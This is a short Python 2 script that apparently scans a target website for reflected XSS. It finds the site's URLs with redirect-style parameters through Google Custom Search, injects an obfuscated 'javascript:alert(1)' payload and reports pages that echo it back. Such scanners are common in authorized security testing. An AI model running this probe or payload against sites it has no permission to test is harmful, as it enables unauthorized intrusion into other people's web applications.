#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import requests

from googleapiclient.discovery import build
from urlparse import urlparse, parse_qs
from urllib import urlencode


PAGE_SIZE = 10

# https://console.developers.google.com/apis/api/customsearch/overview
# 新建一个项目，然后获取其配置KEY，一个KEY每天免费搜索100次
DEVELOPER_KEY = ''

# https://cse.google.com/cse/all 
# 添加一个搜索引擎，要搜索的网站设为整个网络，搜索引擎ID
CUSTOM_SEARCH_ENGINE = ''

session = requests.Session()
session.trust_env = False


def search_links(site, keyword, link_dict):
    service = build("customsearch", "v1", developerKey=DEVELOPER_KEY)
    cse = service.cse()
    query = 'site:%s inurl:%s=http' % (site, keyword)
    start = 1
    for i in range(10):
        res = service.cse().list(
            q=query,
            start=start,
            num=PAGE_SIZE,
            cx=CUSTOM_SEARCH_ENGINE).execute()
        if 'items' not in res:
            break

        for item in res['items']:
            link = urlparse(item['link'])
            key = link.netloc + link.path
            if key not in link_dict:
                link_dict[key] = link
        start += PAGE_SIZE


def verify(link, keywords):
    payload = 'java\\u0073cript\\u003a\\u0061lert(1);'
    query = parse_qs(link.query)
    for k in keywords:
        if k not in query:
            continue
        query[k] = payload
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'         
        }
        l = link._replace(query=urlencode(query))
        try:
            res = session.get(l.geturl(), headers=headers)
            if res.status_code / 100 != 2:
                continue
            if payload in res.text:
                print "[Potential XSS vulnerability] " + l.geturl()
        except:
            print '[ERROR] requesting: ' + l.geturl()
            continue


def main(site):
    print '[INFO] Searching links'
    links = {}
    keywords = ['url', 'target', 'u']
    for k in keywords:
        search_links(site, k, links)
    # print links

    print '[INFO] Finding XSS ...'
    for k, v in links.items():
        verify(v, keywords)


if __name__ == '__main__':
    main(sys.argv[1])
